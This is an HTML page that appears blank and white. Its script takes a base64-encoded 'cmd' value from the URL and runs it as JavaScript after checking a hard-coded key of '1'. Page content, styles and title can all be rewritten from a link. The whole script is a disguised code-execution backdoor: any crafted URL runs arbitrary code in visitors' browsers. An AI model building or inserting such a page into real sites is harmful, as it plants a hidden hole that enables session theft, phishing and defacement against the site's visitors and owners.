<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>White Site</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: white;
            min-height: 100vh;
            padding: 40px 20px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            padding: 40px;
        }
        
        #output {
            color: #000000;
            font-family: monospace;
            font-size: 14px;
            line-height: 1.6;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="output"></div>
    </div>

    <script>
        // ========== СЕКРЕТНЫЙ КЛЮЧ ==========
        const SECRET_KEY = "1";
        // ====================================
        
        const outputDiv = document.getElementById('output');
        
        // Очищаем всё при загрузке
        outputDiv.innerHTML = '';
        
        // Функция для вывода (только для результатов скрипта)
        function showResult(text, isError = false) {
            const line = document.createElement('div');
            line.textContent = text;
            line.style.color = isError ? '#ff0000' : '#000000';
            line.style.marginBottom = '8px';
            outputDiv.appendChild(line);
        }
        
        function clearResult() {
            outputDiv.innerHTML = '';
        }
        
        // Получаем параметры из URL
        function getParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                key: params.get('key'),
                cmd: params.get('cmd')
            };
        }
        
        // Декодируем base64
        function decodeBase64(str) {
            try {
                return atob(str);
            } catch(e) {
                return null;
            }
        }
        
        // Выполняем JavaScript код
        function executeCode(code) {
            try {
                // Создаём функцию с доступом к утилитам
                const wrappedCode = `
                    (function() {
                        // Утилиты для скрипта
                        const api = {
                            log: (msg) => {
                                const line = document.createElement('div');
                                line.textContent = msg;
                                line.style.color = '#000';
                                document.getElementById('output').appendChild(line);
                            },
                            clear: () => {
                                document.getElementById('output').innerHTML = '';
                            },
                            html: (content) => {
                                document.getElementById('output').innerHTML = content;
                            },
                            style: (css) => {
                                const style = document.createElement('style');
                                style.textContent = css;
                                document.head.appendChild(style);
                            },
                            title: (t) => {
                                document.title = t;
                            },
                            bg: (color) => {
                                document.body.style.background = color;
                            }
                        };
                        
                        ${code}
                    })();
                `;
                
                const func = new Function(wrappedCode);
                func();
                return true;
            } catch(e) {
                showResult('❌ Ошибка: ' + e.message, true);
                return false;
            }
        }
        
        // Главная функция
        function init() {
            const params = getParams();
            
            // Если нет параметров - ничего не делаем, просто белая страница
            if (!params.key && !params.cmd) {
                return;
            }
            
            // Проверяем ключ
            if (params.key !== SECRET_KEY) {
                showResult('❌ Неверный ключ', true);
                return;
            }
            
            // Если есть команда
            if (params.cmd) {
                const decoded = decodeBase64(params.cmd);
                if (decoded) {
                    executeCode(decoded);
                } else {
                    showResult('❌ Ошибка декодирования', true);
                }
            }
        }
        
        // Запускаем
        init();
    </script>
</body>
</html>
